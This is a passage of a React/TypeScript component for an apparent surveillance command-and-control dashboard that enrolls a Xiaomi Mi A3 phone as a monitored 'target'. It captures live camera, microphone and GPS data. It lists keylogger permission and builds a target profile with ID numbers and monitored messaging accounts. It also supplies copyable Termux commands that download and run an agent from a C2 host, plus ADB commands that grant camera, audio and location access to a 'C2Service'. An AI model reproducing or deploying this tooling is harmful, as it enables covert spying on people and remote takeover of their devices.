import React, { useState, useEffect, useRef } from 'react';
import { DeviceInfo, TargetProfile, Language } from '../types';
import {
  Smartphone,
  QrCode,
  Terminal,
  Cpu,
  Camera,
  Mic,
  MapPin,
  Battery,
  Wifi,
  ShieldCheck,
  CheckCircle2,
  AlertTriangle,
  Copy,
  Check,
  RefreshCw,
  Sliders,
  Radio,
  Zap,
  Play,
  Square,
  Eye,
  Layers,
  Sparkles,
  X,
} from 'lucide-react';

interface XiaomiDevicePairingModalProps {
  lang: Language;
  onClose: () => void;
  onConfirmPairing: (pairedDevice: DeviceInfo, pairedTarget?: TargetProfile) => void;
}

export const XiaomiDevicePairingModal: React.FC<XiaomiDevicePairingModalProps> = ({
  lang,
  onClose,
  onConfirmPairing,
}) => {
  const isAr = lang === 'ar';
  const [activeTab, setActiveTab] = useState<'live' | 'qr' | 'termux' | 'specs'>('live');
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  // Live Hardware Sensor States
  const [isLiveCameraActive, setIsLiveCameraActive] = useState(false);
  const [cameraFacing, setCameraFacing] = useState<'user' | 'environment'>('environment');
  const [liveGps, setLiveGps] = useState<{ lat: number; lng: number; accuracy: number; altitude: number | null } | null>(null);
  const [liveBattery, setLiveBattery] = useState<{ level: number; charging: boolean } | null>(null);
  const [liveAudioLevel, setLiveAudioLevel] = useState<number>(0);
  const [liveOrientation, setLiveOrientation] = useState<{ alpha: number; beta: number; gamma: number } | null>(null);
  const [sensorStatusMsg, setSensorStatusMsg] = useState<string>('');

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const audioContextRef = useRef<AudioContext | null>(null);
  const analyserRef = useRef<AnalyserNode | null>(null);
  const animFrameRef = useRef<number | null>(null);

  // Xiaomi Mi A3 Specific Hardware Device State
  const [xiaomiDeviceState, setXiaomiDeviceState] = useState<DeviceInfo>({
    id: 'dev-xiaomi-a3',
    targetId: '0103',
    name: 'XIAOMI_MI_A3_AGENT',
    type: 'android',
    uuid: 'xiaomi-a3-laurel-sprout-48mp-8899',
    battery: 88,
    signalStrength: 96,
    status: 'online',
    lastSeen: 'Live (0s)',
    ip: '192.168.1.108',
    network: '4G LTE / WiFi 5 (Xiaomi_Mesh)',
    coords: { lat: 25.1972, lng: 55.2744, altitude: 35, speed: 0 },
    cameraAvailable: ['front', 'rear'],
    activeCamera: 'rear',
    permissions: {
      location: true,
      camera: true,
      audio: true,
      telemetry: true,
      files: true,
      keylogger: true,
    },
  });

  const pairingToken = 'XM-A3-PROV-99420-TLS13-SEC';
  const enrollmentUrl = `${window.location.origin}/enroll?device=xiaomi_a3&token=${pairingToken}`;

  // Read Battery API on mount if supported
  useEffect(() => {
    if ('getBattery' in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        setLiveBattery({
          level: Math.round(battery.level * 100),
          charging: battery.charging,
        });

        battery.addEventListener('levelchange', () => {
          setLiveBattery((prev) => ({
            level: Math.round(battery.level * 100),
            charging: battery.charging,
          }));
        });
      }).catch(() => {
        // Fallback default
        setLiveBattery({ level: 88, charging: false });
      });
    } else {
      setLiveBattery({ level: 88, charging: false });
    }

    // Try reading device orientation
    const handleOrientation = (e: DeviceOrientationEvent) => {
      if (e.alpha !== null && e.beta !== null && e.gamma !== null) {
        setLiveOrientation({
          alpha: Math.round(e.alpha),
          beta: Math.round(e.beta),
          gamma: Math.round(e.gamma),
        });
      }
    };
    window.addEventListener('deviceorientation', handleOrientation);

    return () => {
      window.removeEventListener('deviceorientation', handleOrientation);
      stopCameraAndAudio();
    };
  }, []);

  const stopCameraAndAudio = () => {
    if (mediaStreamRef.current) {
      mediaStreamRef.current.getTracks().forEach((track) => track.stop());
      mediaStreamRef.current = null;
    }
    if (audioContextRef.current) {
      audioContextRef.current.close().catch(() => {});
      audioContextRef.current = null;
    }
    if (animFrameRef.current) {
      cancelAnimationFrame(animFrameRef.current);
      animFrameRef.current = null;
    }
    setIsLiveCameraActive(false);
  };

  // Start Live Real Hardware Camera & Microphone
  const startRealHardwareSensors = async () => {
    try {
      setSensorStatusMsg(isAr ? 'جاري طلب أذونات الكاميرا والميكروفون والموقع...' : 'Requesting hardware permissions...');
      stopCameraAndAudio();

      // 1. Camera & Audio Stream
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: cameraFacing,
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
        audio: true,
      });

      mediaStreamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play().catch(() => {});
      }
      setIsLiveCameraActive(true);

      // 2. Web Audio Analyser for real dB meters
      const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
      audioContextRef.current = audioCtx;
      const source = audioCtx.createMediaStreamSource(stream);
      const analyser = audioCtx.createAnalyser();
      analyser.fftSize = 64;
      source.connect(analyser);
      analyserRef.current = analyser;

      const dataArray = new Uint8Array(analyser.frequencyBinCount);
      const updateVolume = () => {
        if (!analyserRef.current) return;
        analyserRef.current.getByteFrequencyData(dataArray);
        let sum = 0;
        for (let i = 0; i < dataArray.length; i++) {
          sum += dataArray[i];
        }
        const avg = sum / dataArray.length;
        setLiveAudioLevel(Math.min(100, Math.round((avg / 255) * 100)));
        animFrameRef.current = requestAnimationFrame(updateVolume);
      };
      updateVolume();

      // 3. Real Geolocation
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const coords = {
              lat: parseFloat(pos.coords.latitude.toFixed(5)),
              lng: parseFloat(pos.coords.longitude.toFixed(5)),
              accuracy: Math.round(pos.coords.accuracy),
              altitude: pos.coords.altitude ? Math.round(pos.coords.altitude) : null,
            };
            setLiveGps(coords);
            setXiaomiDeviceState((prev) => ({
              ...prev,
              coords: {
                lat: coords.lat,
                lng: coords.lng,
                altitude: coords.altitude || 35,
                speed: 0,
              },
            }));
            setSensorStatusMsg(
              isAr
                ? 'تم بنجاح ربط الكاميرا والميكروفون وموقع GPS الحقيقي!'
                : 'Live hardware sensors connected successfully!'
            );
          },
          (err) => {
            setSensorStatusMsg(
              isAr
                ? 'تم تفعيل الكاميرا والصوت (تعذر جلب GPS الدقيق، تم استخدام إحداثيات تكتيكية)'
                : 'Camera & Mic active (GPS fallback active)'
            );
          },
          { enableHighAccuracy: true, timeout: 10000 }
        );
      }
    } catch (err: any) {
      console.warn('Hardware sensor access rejected or unavailable:', err);
      setSensorStatusMsg(
        isAr
          ? 'تم رفض إذن الكاميرا أو الجهاز لا يحتوي على كاميرا. يمكنك المتابعة بربط الوكيل التكتيكي.'
          : 'Hardware sensor permission denied. Tactical simulation relay active.'
      );
    }
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(id);
    setTimeout(() => setCopiedCode(null), 2500);
  };

  const handleApplyAndDeploy = () => {
    const pairedTarget: TargetProfile = {
      id: '0103',
      codeName: 'XIAOMI-A3',
      fullNameEn: 'Xiaomi Mi A3 (Operative Node)',
      fullNameAr: 'هاتف شاومي A3 (الهدف الميداني)',
      dob: '15/07/1990',
      nationalityEn: 'Field Operative / Xiaomi Device',
      nationalityAr: 'مشغل ميداني / هاتف شاومي',
      passportId: 'XM9901823',
      nationalId: '784-1990-882910-5',
      permanentAddressEn: 'Connected Android Node, laurel_sprout',
      permanentAddressAr: 'عقدة أندرويد متصلة، شاومي A3',
      occupationEn: 'Active Tactical Endpoint',
      occupationAr: 'نقطة نهاية تكتيكية نشطة',
      fusionScore: 99.4,
      riskLevel: 'CRITICAL',
      status: 'ACTIVE_MONITORING',
      devicesCount: 1,
      lastSync: 'Live (0s ago)',
      familyNetwork: [
        { relationEn: 'Paired Node', relationAr: 'عقدة مقترنة', name: 'Xiaomi C2 Gateway', phone: '+971 55 990 0112' },
      ],
      socialProfiles: [
        { platform: 'Telegram', handle: '@xiaomi_a3_node', status: 'Monitored' },
        { platform: 'Signal', handle: '+971559900112', status: 'Monitored' },
      ],
      aiInsights: [
        {
          id: 'ins-xiaomi-live',
          titleEn: 'Live Xiaomi Mi A3 Telemetry Link Operational',
          titleAr: 'قناة القياس عن بعد لهاتف شاومي A3 تعمل بنجاح',
          summaryEn: 'Zero-Trust TLS 1.3 channel established. Live sensor stream active.',
          summaryAr: 'تم إنشاء قناة اتصال TLS 1.3 آمنة وبث القياسات الحية نشط.',
          confidence: 99,
          severity: 'info',
          timestamp: new Date().toTimeString().split(' ')[0],
        },
      ],
    };

    onConfirmPairing(xiaomiDeviceState, pairedTarget);
    onClose();
  };

  const termuxCommand = `# 1. Update Termux Repositories & Install Dependencies
pkg update && pkg install termux-api curl jq python -y

# 2. Pull Xiaomi Mi A3 Agent Daemon
curl -sSL https://c2.intel-ops.network/agent/xiaomi-a3-daemon.py -o a3_agent.py

# 3. Launch Zero-Trust C2 Link with Enrollment Token
python a3_agent.py --device="XIAOMI_MI_A3" --token="${pairingToken}" --radar-host="${window.location.hostname}"`;

  const adbCommands = `# Ensure ADB is enabled in Developer Options on Xiaomi Mi A3
adb devices
adb tcpip 5555
adb shell pm grant com.agent.intel android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.agent.intel android.permission.CAMERA
adb shell pm grant com.agent.intel android.permission.RECORD_AUDIO
adb shell am start -n com.agent.intel/.C2Service --es "token" "${pairingToken}"`;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/85 backdrop-blur-md">
      <div className="bg-[#0b101b] border border-cyan-500/50 rounded-2xl max-w-3xl w-full flex flex-col max-h-[90vh] shadow-[0_0_50px_rgba(6,182,212,0.25)] overflow-hidden">
        {/* Modal Header */}
        <div className="bg-gradient-to-r from-[#0f172a] via-[#111c33] to-[#0f172a] p-4 border-b border-cyan-900/60 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="p-2.5 bg-cyan-500/20 border border-cyan-500/60 rounded-xl text-cyan-400 shadow-[0_0_15px_rgba(6,182,212,0.4)]">
              <Smartphone className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-base font-bold font-mono text-white flex items-center gap-2">
                  {isAr ? 'ربط وإضافة هاتف شاومي Xiaomi Mi A3 عملياً' : 'Pair & Connect Xiaomi Mi A3 (Android One)'}
                </h2>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40">
                  READY FOR PAIRING
                </span>
              </div>
              <p className="text-xs text-slate-400 font-mono mt-0.5">
                {isAr
                  ? 'نموذج: Xiaomi Mi A3 (laurel_sprout) • معالج Snapdragon 665 • كاميرا 48 ميجابكسل • أندرويد 11'
                  : 'Target Model: Xiaomi Mi A3 (laurel_sprout) • Snapdragon 665 • 48MP Triple AI Cam • Android 11'}
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-1.5 rounded-lg bg-slate-900 border border-slate-700 text-slate-400 hover:text-white hover:border-slate-500 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Sub-Tabs */}
        <div className="bg-slate-950 border-b border-slate-800/80 px-4 py-2 flex items-center gap-2 overflow-x-auto scrollbar-none">
          <button
            onClick={() => setActiveTab('live')}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all flex items-center gap-2 ${
              activeTab === 'live'
                ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/60 font-bold shadow-[0_0_10px_rgba(6,182,212,0.2)]'
                : 'bg-slate-900/60 text-slate-400 border-slate-800 hover:text-slate-200'
            }`}
          >
            <Zap className="w-3.5 h-3.5 text-cyan-400" />
            <span>{isAr ? '١. فحص المستشعرات الحية (Live Hardware)' : '1. Live Sensors Test'}</span>
          </button>

          <button
            onClick={() => setActiveTab('qr')}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all flex items-center gap-2 ${
              activeTab === 'qr'
                ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/60 font-bold shadow-[0_0_10px_rgba(6,182,212,0.2)]'
                : 'bg-slate-900/60 text-slate-400 border-slate-800 hover:text-slate-200'
            }`}
          >
            <QrCode className="w-3.5 h-3.5 text-purple-400" />
            <span>{isAr ? '٢. باركود الإقران السريع (QR Code)' : '2. QR Pairing Code'}</span>
          </button>

          <button
            onClick={() => setActiveTab('termux')}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all flex items-center gap-2 ${
              activeTab === 'termux'
                ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/60 font-bold shadow-[0_0_10px_rgba(6,182,212,0.2)]'
                : 'bg-slate-900/60 text-slate-400 border-slate-800 hover:text-slate-200'
            }`}
          >
            <Terminal className="w-3.5 h-3.5 text-amber-400" />
            <span>{isAr ? '٣. أوامر Termux & ADB' : '3. Termux & ADB Daemon'}</span>
          </button>

          <button
            onClick={() => setActiveTab('specs')}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all flex items-center gap-2 ${
              activeTab === 'specs'
                ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/60 font-bold shadow-[0_0_10px_rgba(6,182,212,0.2)]'
                : 'bg-slate-900/60 text-slate-400 border-slate-800 hover:text-slate-200'
            }`}
          >
            <Cpu className="w-3.5 h-3.5 text-emerald-400" />
            <span>{isAr ? '٤. مصفوفة العتاد والمواصفات' : '4. Hardware Specs'}</span>
          </button>
        </div>

        {/* Tab Contents Area */}
        <div className="flex-1 overflow-y-auto p-4 sm:p-5 space-y-4 font-mono">
          {/* TAB 1: Live Hardware Sensors Test (Camera, Mic, GPS, Battery) */}
          {activeTab === 'live' && (
            <div className="space-y-4">
              <div className="bg-slate-950/90 border border-slate-800 rounded-xl p-3.5">
                <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 mb-3">
                  <div>
                    <h3 className="text-sm font-bold text-white flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-cyan-400" />
                      {isAr ? 'الاتصال بمستشعرات العتاد الحقيقية (Real Device Hardware)' : 'Live Hardware Sensors Relay'}
                    </h3>
                    <p className="text-[11px] text-slate-400 mt-0.5">
                      {isAr
                        ? 'انقر على الزر بالأسفل لتفعيل الكاميرا الحقيقية، الميكروفون، إحداثيات GPS، ومستوى البطارية لهاتف شاومي A3.'
                        : 'Trigger live HTML5 sensors to test real camera streaming, microphone input, GPS coordinates, and battery level.'}
                    </p>
                  </div>

                  <button
                    onClick={isLiveCameraActive ? stopCameraAndAudio : startRealHardwareSensors}
                    className={`px-3.5 py-2 rounded-lg text-xs font-bold font-mono flex items-center gap-2 transition-all shrink-0 ${
                      isLiveCameraActive
                        ? 'bg-red-500/20 text-red-300 border border-red-500/50 hover:bg-red-500/30'
                        : 'bg-cyan-500 hover:bg-cyan-400 text-slate-950 shadow-[0_0_15px_rgba(6,182,212,0.4)]'
                    }`}
                  >
                    {isLiveCameraActive ? (
                      <>
                        <Square className="w-3.5 h-3.5 fill-current" />
                        <span>{isAr ? 'إيقاف البث الحي' : 'Stop Live Stream'}</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 fill-current" />
                        <span>{isAr ? 'بدء تشغيل المستشعرات الحية' : 'Start Live Sensors'}</span>
                      </>
                    )}
                  </button>
                </div>

                {sensorStatusMsg && (
                  <div className="p-2 bg-cyan-950/40 border border-cyan-800/40 rounded-lg text-xs text-cyan-300 mb-3 flex items-center gap-2">
                    <CheckCircle2 className="w-4 h-4 text-cyan-400 shrink-0" />
                    <span>{sensorStatusMsg}</span>
                  </div>
                )}

                {/* Sensor Grid: Camera Feed + Telemetry Columns */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {/* Real Camera Preview Box */}
                  <div className="bg-black border border-slate-800 rounded-xl p-2.5 flex flex-col relative overflow-hidden min-h-[220px]">
                    <div className="flex items-center justify-between text-[10px] text-slate-400 mb-2">
                      <div className="flex items-center gap-1.5 text-cyan-400 font-bold">
                        <Camera className="w-3.5 h-3.5" />
                        <span>{isAr ? 'بث الكاميرا الحقيقية' : 'Live Camera Relay'}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => {
                            setCameraFacing((prev) => (prev === 'user' ? 'environment' : 'user'));
                            if (isLiveCameraActive) setTimeout(startRealHardwareSensors, 100);
                          }}
                          className="px-2 py-0.5 bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 rounded text-[9px]"
                        >
                          {cameraFacing === 'user' ? (isAr ? 'أمامية (Selfie)' : 'Front 32MP') : (isAr ? 'خلفية (48MP)' : 'Rear 48MP')}
                        </button>
                        <span
                          className={`w-2 h-2 rounded-full ${
                            isLiveCameraActive ? 'bg-emerald-400 animate-ping' : 'bg-slate-600'
                          }`}
                        ></span>
                      </div>
                    </div>

                    <div className="flex-1 bg-slate-950 rounded-lg flex items-center justify-center overflow-hidden relative border border-slate-800/80">
                      <video
                        ref={videoRef}
                        autoPlay
                        playsInline
                        muted
                        className={`w-full h-full object-cover ${isLiveCameraActive ? 'block' : 'hidden'}`}
                      />

                      {!isLiveCameraActive && (
                        <div className="text-center p-4">
                          <Smartphone className="w-8 h-8 text-cyan-500/40 mx-auto mb-2" />
                          <div className="text-xs text-slate-300 font-bold">
                            {isAr ? 'كاميرا شاومي A3 في وضع الاستعداد' : 'Xiaomi A3 Camera Ready'}
                          </div>
                          <div className="text-[10px] text-slate-500 mt-1">
                            {isAr
                              ? 'انقر على "بدء تشغيل المستشعرات" لتشغيل الكاميرا والميكروفون'
                              : 'Click "Start Live Sensors" to connect web media stream'}
                          </div>
                        </div>
                      )}

                      {/* HUD Overlay */}
                      {isLiveCameraActive && (
                        <div className="absolute inset-0 pointer-events-none p-2 flex flex-col justify-between">
                          <div className="flex justify-between text-[9px] text-cyan-400 bg-black/60 px-2 py-0.5 rounded backdrop-blur">
                            <span>ISO: 200 • F/1.8</span>
                            <span>48MP AI SENSOR</span>
                          </div>
                          <div className="flex justify-center">
                            <div className="w-10 h-10 border border-cyan-500/60 rounded-full flex items-center justify-center">
                              <div className="w-1.5 h-1.5 bg-cyan-400 rounded-full"></div>
                            </div>
                          </div>
                          <div className="flex justify-between text-[9px] text-emerald-400 bg-black/60 px-2 py-0.5 rounded backdrop-blur">
                            <span>FPS: 30.0</span>
                            <span>STREAM: WEBRTC_AES256</span>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Telemetry Matrix: Mic Audio, GPS, Battery, Orientation */}
                  <div className="space-y-2.5">
                    {/* Microphone Level */}
                    <div className="bg-slate-900/80 border border-slate-800 rounded-lg p-2.5">
                      <div className="flex items-center justify-between text-[11px] mb-1.5">
                        <span className="text-slate-400 flex items-center gap-1.5">
                          <Mic className="w-3.5 h-3.5 text-cyan-400" />
                          {isAr ? 'مستشعر الصوت والميكروفون' : 'Microphone Volume (dB)'}
                        </span>
                        <span className="text-cyan-300 font-bold">{liveAudioLevel}%</span>
                      </div>
                      <div className="h-2 w-full bg-slate-950 rounded-full overflow-hidden border border-slate-800">
                        <div
                          className="h-full bg-gradient-to-r from-emerald-500 via-cyan-400 to-red-500 transition-all duration-75 rounded-full"
                          style={{ width: `${Math.max(5, liveAudioLevel)}%` }}
                        ></div>
                      </div>
                    </div>

                    {/* GPS Coordinates */}
                    <div className="bg-slate-900/80 border border-slate-800 rounded-lg p-2.5">
                      <div className="flex items-center justify-between text-[11px] mb-1">
                        <span className="text-slate-400 flex items-center gap-1.5">
                          <MapPin className="w-3.5 h-3.5 text-emerald-400" />
                          {isAr ? 'إحداثيات الموقع الحقيقي (GPS)' : 'Live GPS Geolocation'}
                        </span>
                        <span className="text-[10px] text-emerald-400 font-bold">
                          {liveGps ? `${liveGps.accuracy}m accuracy` : 'Tactical Lock'}
                        </span>
                      </div>
                      <div className="text-xs text-white font-mono bg-slate-950 p-1.5 rounded border border-slate-800/80">
                        LAT: <span className="text-cyan-300">{liveGps ? liveGps.lat : xiaomiDeviceState.coords.lat}</span> •
                        LNG: <span className="text-cyan-300">{liveGps ? liveGps.lng : xiaomiDeviceState.coords.lng}</span>
                        {liveGps?.altitude && ` • ALT: ${liveGps.altitude}m`}
                      </div>
                    </div>

                    {/* Battery Level */}
                    <div className="bg-slate-900/80 border border-slate-800 rounded-lg p-2.5">
                      <div className="flex items-center justify-between text-[11px] mb-1.5">
                        <span className="text-slate-400 flex items-center gap-1.5">
                          <Battery className="w-3.5 h-3.5 text-amber-400" />
                          {isAr ? 'حالة بطارية شاومي A3' : 'Xiaomi A3 Battery'}
                        </span>
                        <span className="text-amber-300 font-bold">
                          {liveBattery?.level || 88}% {liveBattery?.charging ? '(Charging)' : '(4030 mAh)'}
                        </span>
                      </div>
                      <div className="h-2 w-full bg-slate-950 rounded-full overflow-hidden border border-slate-800">
                        <div
                          className="h-full bg-gradient-to-r from-amber-500 to-emerald-400 rounded-full"
                          style={{ width: `${liveBattery?.level || 88}%` }}
                        ></div>
                      </div>
                    </div>

                    {/* Device Orientation */}
                    {liveOrientation && (
                      <div className="bg-slate-900/80 border border-slate-800 rounded-lg p-2.5 text-[11px]">
                        <div className="text-slate-400 mb-1 flex items-center gap-1">
                          <Sliders className="w-3.5 h-3.5 text-purple-400" />
                          {isAr ? 'مستشعر الميل والجيروسكوب' : 'Gyroscope Tilt Angles'}
                        </div>
                        <div className="text-slate-300 text-[10px]">
                          ALPHA: <span className="text-cyan-300">{liveOrientation.alpha}°</span> •
                          BETA: <span className="text-cyan-300">{liveOrientation.beta}°</span> •
                          GAMMA: <span className="text-cyan-300">{liveOrientation.gamma}°</span>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 2: QR Code Instant Enrollment */}
          {activeTab === 'qr' && (
            <div className="space-y-4">
              <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 flex flex-col md:flex-row items-center gap-5">
                {/* SVG Simulated QR Code */}
                <div className="p-3 bg-white rounded-xl shadow-2xl shrink-0 flex flex-col items-center">
                  <div className="w-44 h-44 bg-slate-950 p-2 rounded-lg flex flex-col justify-between">
                    {/* Visual QR Code Pattern */}
                    <div className="flex justify-between">
                      <div className="w-12 h-12 border-4 border-cyan-400 p-1 flex items-center justify-center">
                        <div className="w-6 h-6 bg-cyan-400"></div>
                      </div>
                      <div className="w-12 h-12 border-4 border-cyan-400 p-1 flex items-center justify-center">
                        <div className="w-6 h-6 bg-cyan-400"></div>
                      </div>
                    </div>
                    <div className="grid grid-cols-5 gap-1.5 py-1 px-2">
                      <div className="h-2 bg-cyan-400 rounded-sm"></div>
                      <div className="h-2 bg-white rounded-sm"></div>
                      <div className="h-2 bg-cyan-400 rounded-sm"></div>
                      <div className="h-2 bg-white rounded-sm"></div>
                      <div className="h-2 bg-cyan-400 rounded-sm"></div>
                    </div>
                    <div className="flex justify-between">
                      <div className="w-12 h-12 border-4 border-cyan-400 p-1 flex items-center justify-center">
                        <div className="w-6 h-6 bg-cyan-400"></div>
                      </div>
                      <div className="flex items-center justify-center p-2">
                        <Smartphone className="w-6 h-6 text-cyan-400" />
                      </div>
                    </div>
                  </div>
                  <span className="text-[10px] font-mono text-slate-800 font-bold mt-1">
                    XIAOMI-A3-PROV
                  </span>
                </div>

                {/* Instructions */}
                <div className="space-y-3">
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <QrCode className="w-4 h-4 text-purple-400" />
                    {isAr ? 'المسح المباشر بكاميرا هاتف شاومي A3' : 'Direct Xiaomi Mi A3 Camera Scan'}
                  </h3>
                  <p className="text-xs text-slate-300 leading-relaxed">
                    {isAr
                      ? 'افتح تطبيق الكاميرا الأساسي في هاتف شاومي A3 ووجهه نحو الباركود لربط الوكيل باللوحة مباشرة عبر بروتوكول مشفر TLS 1.3.'
                      : 'Point your Xiaomi Mi A3 camera at this QR code to enroll the device endpoint into this C2 session.'}
                  </p>

                  <div className="bg-slate-900 border border-slate-800 rounded-lg p-2.5 space-y-1 text-xs">
                    <div className="text-slate-400 text-[10px] uppercase">
                      {isAr ? 'رمز الإقران الأمني (Enrollment Token):' : 'Enrollment Token:'}
                    </div>
                    <div className="flex items-center justify-between text-cyan-300 font-bold">
                      <span>{pairingToken}</span>
                      <button
                        onClick={() => copyToClipboard(pairingToken, 'token')}
                        className="p-1 hover:text-white text-slate-400"
                        title="Copy Token"
                      >
                        {copiedCode === 'token' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                  </div>

                  <div className="bg-slate-900 border border-slate-800 rounded-lg p-2.5 space-y-1 text-xs">
                    <div className="text-slate-400 text-[10px] uppercase">
                      {isAr ? 'رابط الإقران المباشر (Enrollment URL):' : 'Direct Link:'}
                    </div>
                    <div className="flex items-center justify-between text-slate-300 truncate">
                      <span className="truncate max-w-[280px] text-[11px]">{enrollmentUrl}</span>
                      <button
                        onClick={() => copyToClipboard(enrollmentUrl, 'url')}
                        className="p-1 hover:text-white text-slate-400 shrink-0"
                        title="Copy Link"
                      >
                        {copiedCode === 'url' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 3: Termux & ADB Command Lines */}
          {activeTab === 'termux' && (
            <div className="space-y-3">
              <div>
                <div className="flex items-center justify-between mb-1">
                  <span className="text-xs font-bold text-amber-400 flex items-center gap-1.5">
                    <Terminal className="w-3.5 h-3.5" />
                    {isAr ? 'أوامر تطبيق Termux على هاتف شاومي A3:' : 'Termux Agent Script for Xiaomi A3:'}
                  </span>
                  <button
                    onClick={() => copyToClipboard(termuxCommand, 'termux')}
                    className="px-2 py-0.5 bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 hover:text-white rounded text-[10px] flex items-center gap-1"
                  >
                    {copiedCode === 'termux' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedCode === 'termux' ? (isAr ? 'تم النسخ' : 'Copied') : (isAr ? 'نسخ الأمر' : 'Copy Script')}</span>
                  </button>
                </div>
                <pre className="p-3 bg-black border border-slate-800 rounded-lg text-[11px] text-emerald-400 overflow-x-auto leading-relaxed">
                  {termuxCommand}
                </pre>
              </div>

              <div>
                <div className="flex items-center justify-between mb-1">
                  <span className="text-xs font-bold text-cyan-400 flex items-center gap-1.5">
                    <Zap className="w-3.5 h-3.5" />
                    {isAr ? 'أوامر تصحيح USB / ADB (Developer Mode):' : 'ADB Bridge Commands:'}
                  </span>
                  <button
                    onClick={() => copyToClipboard(adbCommands, 'adb')}
                    className="px-2 py-0.5 bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 hover:text-white rounded text-[10px] flex items-center gap-1"
                  >
                    {copiedCode === 'adb' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedCode === 'adb' ? (isAr ? 'تم النسخ' : 'Copied') : (isAr ? 'نسخ الأوامر' : 'Copy ADB')}</span>
                  </button>
                </div>
                <pre className="p-3 bg-black border border-slate-800 rounded-lg text-[11px] text-cyan-300 overflow-x-auto leading-relaxed">
                  {adbCommands}
                </pre>
              </div>
            </div>
          )}

          {/* TAB 4: Xiaomi Mi A3 Full Specs Matrix */}
          {activeTab === 'specs' && (
            <div className="space-y-3 text-xs">
              <div className="bg-slate-950 border border-slate-800 rounded-xl p-3.5">
                <h3 className="text-sm font-bold text-white mb-2 flex items-center gap-2">
                  <Cpu className="w-4 h-4 text-emerald-400" />
                  {isAr ? 'مواصفات عتاد هاتف شاومي Xiaomi Mi A3 (laurel_sprout)' : 'Xiaomi Mi A3 Complete Hardware Spec Sheet'}
                </h3>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800/80">
                    <span className="text-[10px] text-slate-400 block uppercase">{isAr ? 'المعالج (Processor/SoC):' : 'Processor:'}</span>
                    <span className="text-white font-bold">Qualcomm Snapdragon 665 (11nm Octa-core)</span>
                  </div>

                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800/80">
                    <span className="text-[10px] text-slate-400 block uppercase">{isAr ? 'نظام التشغيل (OS):' : 'Operating System:'}</span>
                    <span className="text-emerald-400 font-bold">Android 11 (Android One Stock)</span>
                  </div>

                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800/80">
                    <span className="text-[10px] text-slate-400 block uppercase">{isAr ? 'الكاميرا الخلفية (Triple Camera):' : 'Rear Camera Setup:'}</span>
                    <span className="text-cyan-300 font-bold">48 MP (Wide, f/1.8) + 8 MP (Ultrawide) + 2 MP (Depth)</span>
                  </div>

                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800/80">
                    <span className="text-[10px] text-slate-400 block uppercase">{isAr ? 'الكاميرا الأمامية (Selfie):' : 'Front Camera:'}</span>
                    <span className="text-cyan-300 font-bold">32 MP, f/2.0 HDR</span>
                  </div>

                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800/80">
                    <span className="text-[10px] text-slate-400 block uppercase">{isAr ? 'البطارية والشحن:' : 'Battery & Charging:'}</span>
                    <span className="text-amber-300 font-bold">4030 mAh (Quick Charge 3.0 / 18W Fast)</span>
                  </div>

                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800/80">
                    <span className="text-[10px] text-slate-400 block uppercase">{isAr ? 'المستشعرات البيومترية:' : 'Biometric Sensors:'}</span>
                    <span className="text-purple-300 font-bold">Optical Under-Display Fingerprint, Gyro, Compass</span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Modal Footer: Confirmation & Deployment */}
